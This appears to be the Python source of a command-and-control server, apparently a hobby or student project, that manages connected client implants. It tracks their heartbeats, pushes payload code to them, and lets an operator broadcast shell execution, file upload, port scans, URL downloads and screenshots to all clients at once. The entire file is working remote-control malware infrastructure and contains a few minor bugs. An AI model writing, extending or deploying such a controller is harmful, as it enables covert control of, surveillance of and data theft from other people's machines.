import socket
import threading
import time
import json
import os
from termcolor import colored
#for dispaly the refreshing status in sparate cli 
import subprocess
from prettytable import PrettyTable
import platform


# A helper class that represents a client Thread
class ClientThread(threading.Thread):
    def __init__(self, conn, address,id, server, last_alive_time):
        threading.Thread.__init__(self)
        self.id = id
        self.conn = conn
        self.address = address
        #refers to the Server instance that created the ClientThread.
        self.server = server
        self.last_alive_time = last_alive_time
        self.command_results = {}
        self.data_received = threading.Event()  # Create a threading.Event() for self.command_thread to wait until the data is recived
        
    # Recive data from the actual client
    def _recv(self ,socket):
                data = socket.recv(4000).decode("utf-8")
                try:
                    deserialized = json.loads(data)
                except (TypeError, ValueError):
                    raise Exception('Data received was not in JSON format')
                return deserialized

    def run(self):
        print(colored("New client connected at time: {} with ID {}".format(self.last_alive_time ,self.id),"green"))
        #add a new client thread to the list of active client threads being handled by the server.
        self.server.add_client_thread(self)
        while self.server.running:
                data = self._recv(self.conn)
                if not data:
                    return
                message = json.loads(data)
                result = message['command_result']
                if result == "exit":
                            break
                if message['command_result'] == 'keep_alive':
                    self.last_alive_time = time.time()
                else:
                    command_id = message['command_id']
                    print(command_id)
                    if result:
                        print(result)
                        if command_id not in self.command_results:
                            self.command_results[command_id] = []  
                        # add the command result to the ClientTread list by key command_id
                        self.command_results[command_id].append(str(result))
                        # update the command_results list of ClientTread by key command_id
                        self.server.add_client_command_result(command_id ,self.id , self.command_results)
                        print(colored(f'Received result for command {self.server.COMMANDS[command_id]} from client {self.id} \n' , 'green'))
                        self.data_received.set()
        self.conn.close()
        del self.server.client_threads[self.id]
        if len(self.server.client_threads) == 0:
               self.server.have_conn = False
        print("Client disconnected: {}".format(self.id))
        self.data_received.set()
        
        

# Server class
class Server:
    def __init__(self, host, port,refresh_interval):
        self.host = host
        self.port = port
        self.commands_dir = os.path.join(os.getcwd(),"commands_dir")
        self.command_results = {}
        self.command_results_lock = threading.Lock()
        self.client_threads = {} #list of connected clients
        self.client_threads_lock = threading.Lock()
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        self.refresh_interval = refresh_interval
        self.running = True #indicate if the operator exiting the serevr
        self.have_conn =False # indicate if the self.client_threads has at list one client connected to operat on
        self.exit =  json.dumps({"command_type" :"exit"}) # sending this message  in case want close the client socket
        self.command_running_event = threading.Event()
        self.command_running_event.clear()  # set to False initially
        
        

        #Command options for the operator to choose from
        self.OPERATION = {
            1: 'Send Command',
            2: 'Remove/Kill Client',
            3: 'Display Command Result',
            4: 'Exit'
        }

        # Submenue options for choosing a command to send
        self.SUBMENUE_OPTIONS = {
            1: 'Single Client',
            2: 'Broadcast',
        }
        
        # Options of commaand sending
        self.COMMANDS = {
            1: "file_upload",
            2: "shell_exec",
            3: "port_scan",
            4: "dowmload_from_url",
            5: "screenshot"}

        #starting the server
        self.start()
        

#Start the server
    def start(self):
        print(colored(f"Listening on {self.host}:{self.port}", "green"))
        self.command_thread = threading.Thread(target=self.handle_commands)
        self.command_thread.start()
        refresh_thread = threading.Thread(target=self.refresh_status, args=(self.refresh_interval,))
        refresh_thread.daemon = True  # make sure the thread stops when the program exits
        refresh_thread.start()
        client_thread = threading.Thread(target=self.listen_for_clients)
        client_thread.start()

        
        while self.running:
            #Listening and accept new clients  
            try:
                if self.have_conn:
                    self.handle_commands()
            except KeyboardInterrupt:
                print("Shutting down server...")
                self.stop()
                break
        self.command_thread.join()
        self.server_socket.close()
        self.stop()
    

    def listen_for_clients(self):
         while self.running:
            try:
                conn, addr = self.server_socket.accept()
                with self.client_threads_lock:
                    client_id = len(self.client_threads) + 1
                client_thread = ClientThread(conn, addr, client_id, self ,time.time())
                client_thread.start()
            except socket.error:
                pass
            

#Stop the server        
    def stop(self):
        self.running = False
        with self.client_threads_lock:
            clients =dict(self.client_threads)
        for client_id in clients:
                self.kill_client(self.client_threads[client_id])
        self.client_threads = {}
        if self.server_socket is not None:
            self.server_socket.close()
            self.server_socket = None
        print("Server stopped")
            
#Handles user input and executes commands for the server.
    def handle_commands(self): 
        # indicate that the command function is running
        self.command_running_event.set() 
        try:
            while self.running:
                if not self.have_conn:
                    print(colored("There are no clients connected", "red"))
                    return
                
                # Display operation options
                operation = self.operation_options()
            
                # Exit - close server operation
                if operation == 4:
                    print("Exiting...")
                    self.running = False
                    break

                # If not Exit can continue to the submenu
                submenue_option =self.submenue_options()

                # Send command operation
                if operation == 1:
                    cmd = self.command_options()
                    command_to_send = self.generate_cmd( self.COMMANDS[cmd] , cmd)

                    # Broadcast command to all connected clients
                    if submenue_option == 2:
                        with self.client_threads_lock:
                            clients = dict(self.client_threads)
                        for client_id in clients:
                            self.send_cmd(client_id, command_to_send, cmd)
                            
                    # Send command to a single client
                    else:
                        client_id = self.choose_client()
                        self.send_cmd(client_id, command_to_send, cmd)
                        
                        
                # Kill/remove client operation
                elif operation == 2:
                    # Broadcast kill command to all connected clients
                    if submenue_option == 2:
                        with self.client_threads_lock:
                            for client_id in dict(self.client_threads):
                                self.kill_client(self.client_threads[client_id])

                    else:
                        client_id = self.choose_client()
                        with self.client_threads_lock:
                            self.kill_client(self.client_threads[client_id])

                # Display command result operation
                elif operation == 3:
                    # Display all command results for all connected clients
                    if submenue_option == 2:
                            self.display_cmd_result_broadcast()
                    # Display command result for a single client
                    else:
                        client_id = self.choose_client()
                        self.display_cmd_result_single(int(client_id))
        # indicate that the command function has stopped
        finally: self.command_running_event.clear()  

 
#Add or updates if already existing results, 
#command execution of a certain ClientThread according to command ID and ClientThread ID
    def add_client_command_result(self, command_id ,client_thread_id , cmd_result_list):
        with self.command_results_lock:
            if command_id not in self.command_results:
                 self.command_results[command_id] = {}
            self.command_results[command_id][client_thread_id] = cmd_result_list

#Add ClientThread to client_threads list
    def add_client_thread(self, client_thread):
        with self.client_threads_lock:
            self.client_threads[client_thread.id] = client_thread
        self.have_conn = True
        
#Remove ClientThread from client_threads list
    def remove_client_thread(self, client_thread):
        with self.client_threads_lock:
            del self.client_threads[client_thread]
            if len(self.client_threads) == 0:
               self.have_conn = False
        
         
 
#Display operator options and take choosen operation as input
    def operation_options(self):
        print(colored("Choose operation:", "yellow"))
        for (key, value) in enumerate(self.OPERATION.items()):
            print(colored("{}) {}".format(key, value),"cyan"))
        choice = self.input_operator(len(self.OPERATION))
        return choice

#Display submenu options Single client/Broadcast  and take choosen option as input
    def submenue_options(self):
        print(colored("Choose option:", "yellow"))
        for (key, value) in enumerate(self.SUBMENUE_OPTIONS.items()):
            print(colored("{}) {}".format( key, value),"cyan"))
        choice = self.input_operator(len(self.SUBMENUE_OPTIONS))
        return choice

#Display commands options Single  and take choosen command as input
    def command_options(self):
        print(colored("Choose command:", "yellow"))
        for  (key, value) in enumerate(self.COMMANDS.items()):
            print(colored("{}) {}".format( key, value),"cyan"))
        choice = self.input_operator(len(self.COMMANDS))
        return choice

#Display the connected clients and take choosen clients as input
    def choose_client(self):
        with self.client_threads_lock:
            print(colored("Choose a client:" , "yellow"))
            for i, ( client_id ,client_thread) in enumerate(self.client_threads.items()):
                print(colored("{}) {}".format(client_id ,client_thread.id), "cyan"))

            curr_num_of_conn =len(self.client_threads)
            choice = self.input_operator(curr_num_of_conn)
            keys = list(self.client_threads.keys())
            if len(keys) > 0:
                choice = (self.client_threads[keys[int(choice)-1]])
            else:
                print(colored("Empty dictionary. Try again.", "red"))
                return
        return int(choice.id)

#Take valid input     
    def input_operator(self, range):
        while True:
            print(colored("Enter choice [1-{}]: ".format(range), "yellow"))
            choice = input(colored(">>> ", "blue"))
            if choice.isdigit() and int(choice) >= 1 and int(choice) <= range:
                return int(choice)
            else:
                print(colored("Invalid choice. Try again.", "red"))

#Generate command payload from dir acoording to the selected command , return json of the command to send
    def generate_cmd(self, command_type, command_id):

        # get the path to the payload of the selected command
        filepath = os.path.join(self.commands_dir, f"{command_type}.py")

        # Read the contents of the Python file into a string
        with open(filepath, "r") as f:
            command_payload = f.read()
        try:
            command_args = input(colored("Enter Arguments (with comma-separated): \n" ,"yellow")).split(",")
        except Exception as e:
                print(f'Error: {str(e)}')

        # Initialized the command values
        command = {
            "command_payload_path": command_payload,
            "command_type": command_type,
            "command_id": command_id,
            "command_args": command_args
        }
        data = json.dumps(command)
        return data

#Sending command_msg to client with id client_id
    def send_cmd(self, client_id, command_msg, command_id):
        with self.client_threads_lock:
            if client_id not in self.client_threads:
                print(colored("Invalid client ID", "red"))
                return
            self.client_threads[client_id].conn.sendall(command_msg.encode("utf-8"))
            print(colored(f'Sent command {self.COMMANDS[command_id]} to client {client_id} \n',"green"))
            self.client_threads[client_id].data_received.wait()

#Kill client
    def kill_client(self , client):
        # Wait for the threading.Event() object
        client.conn.sendall(self.exit.encode("utf-8"))
        self.client_threads[client.id].data_received.wait()
        return
        
        

#Display the command results for all connected clients.
    def display_cmd_result_broadcast(self):
        with self.command_results_lock:
            if not bool(self.command_results):
                print(colored("Results not found", "red"))
                return
            print(colored("Choose command:", "yellow"))
            for cmd_id in self.command_results:
                print(colored(" {}) {}".format( cmd_id, self.COMMANDS[cmd_id]),"cyan"))
            cmd = input(colored(">>> ", "blue")) 
            print(colored("Result:","cyan"))
            for client_id in self.command_results[int(cmd)]:
                print(colored(str(self.command_results[int(cmd)][client_id]), "cyan"))
                return

#Refresh CLI that display status
    def refresh_status(self, interval):

        while self.running:
            if not self.command_running_event.is_set():
                os.system('cls' if os.name == 'nt' else 'clear')
                with self.client_threads_lock:
                    # num_clients = len(self.client_threads)
                    table = PrettyTable()
                    table.field_names = ["Client ID", "Address" ,"Port", "Last Alive Time"]
                    for thread in self.client_threads:
                        client = self.client_threads[thread]
                        table.add_row([client.id, client.conn.getpeername()[0],client.conn.getpeername()[1],client.last_alive_time])
                    status_str = f"C&C Status: Running \nConnected Clients:\n{table}\n"
                print(status_str)
                
                # subprocess.call(['start', 'C:\\Windows\\System32\\cmd.exe', '/c', 'echo', status_str])
                time.sleep(interval)
                

SERVER_IP = '127.0.0.1'
SERVER_PORT = 44444

s = Server(SERVER_IP , SERVER_PORT, 10)

            
           
        